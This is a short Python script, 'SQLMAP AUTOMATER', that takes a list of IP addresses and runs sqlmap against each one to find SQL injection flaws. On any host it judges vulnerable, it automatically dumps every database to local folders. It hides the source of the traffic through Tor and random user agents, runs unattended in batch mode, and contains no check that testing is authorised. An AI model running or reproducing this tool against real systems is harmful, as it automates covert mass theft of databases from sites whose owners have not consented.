import subprocess
import datetime
import os
import sys
this_os=os.name


#---------------------------------------------------------------------------------------------------------------------
#check if it is vulnerable
def is_vulnerable(module_path,ip,method="GET",data=None,n="5",threads="2",cookies=None):
    if this_os=='nt':
        print("Windows")
        if not module_path:
            print("PATH is required!!!")
            sys.exit(1)
        y=os.path.join(module_path, "sqlmap.py")
        og_cmd=["python",f"{y}","-u",f"http://{ip}",f"--threads={threads}",f"--crawl={n}","--batch","--level=2","--risk=2","--dbs","--random-agent"]
    else:
        og_cmd=["sqlmap","-u",f"http://{ip}",f"--threads={threads}",f"--crawl={n}","--batch","--level=2","--risk=2","--dbs","--tor","--random-agent"]   
    
    
    if method.upper()=="POST":
        og_cmd.extend(["--data",data])
    if cookies:
        og_cmd.extend(["--cookie", cookies])   
    try:
        output=subprocess.run(og_cmd,stderr=subprocess.PIPE,stdout=subprocess.PIPE,text=True)     
    except Exception as e:
        print(f"ERROR....!\n{e}")
    print(output.stdout)
    if "back-end DBMS" in output.stdout:
        return  True
    else:
        return False
#---------------------------------------------------------------------------------------------------------------------
def dump_if_vulnerable(module_path,ip,method="GET",data=None,crawal="5",threads="2",cookies=None):   
    ts_folder = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    output_folder = f"sqlmap_op/sqlmap_{ip.replace('.', '_')}_{ts_folder}"
    os.makedirs(output_folder,exist_ok=True)
    if this_os=='nt':
        print("Windows OS")
        y=os.path.join(module_path, "sqlmap.py")
        cmd=["python",f"{y}","-u",f"http://{ip}",f"--threads={threads}",f"--crawl={crawal}","--batch","--level=2","--risk=2","--tor","--dump-all","--random-agent","--output-dir", output_folder,"--banner"]
    else:
        cmd=["sqlmap","-u",f"http://{ip}",f"--threads={threads}",f"--crawl={crawal}","--batch","--level=2","--risk=2","--tor","--dump-all","--random-agent","--output-dir", output_folder,"--banner"]   
    
    if method.upper()=="POST":
        cmd.extend(["--data",data])
    if cookies:
        cmd.extend(["--cookie", cookies]) 
    try:
        subprocess.run(cmd,stderr=subprocess.PIPE,stdout=subprocess.PIPE,text=True)
    except Exception as e:
        print(f"ERROR1....!\n{e}")

    
    print(f"Output is stored in: {output_folder}")





def main():
    print("\n\t\tSQLMAP AUTOMATER\n")
    ip=input("Enter IPs: ").strip()
    if ip=='' or ip=='\n':
        print("NO IP Detected")
        sys.exit()
    if this_os=='nt':
        module_path=input("Enter sqlmap.py path: ").strip()
    else:
        module_path=None     

    splitted_ip=[i.strip() for i in ip.replace(",", " ").split() if i.strip()]
    methods=input("Enter[GET/POST]: ").strip() or "GET"
    data=input("Enter data e.g[id=1]: ").strip() or None
    crawal=input("Enter directory Crawl depth: ").strip() or "5"
    thread1=input("Enter no. of Threads: ").strip() or "2"
    cookies1=input("Enter Cookie if available: ").strip() or None
    for j in splitted_ip:
        if is_vulnerable(module_path,j,methods,data,crawal,thread1,cookies1):
            print("IS VULNERABLE")
            dump_if_vulnerable(module_path,j,methods,data,crawal,thread1,cookies1)
        else:
            print(f"{j} is not VULNERABLE")    

if __name__=='__main__':
    main()


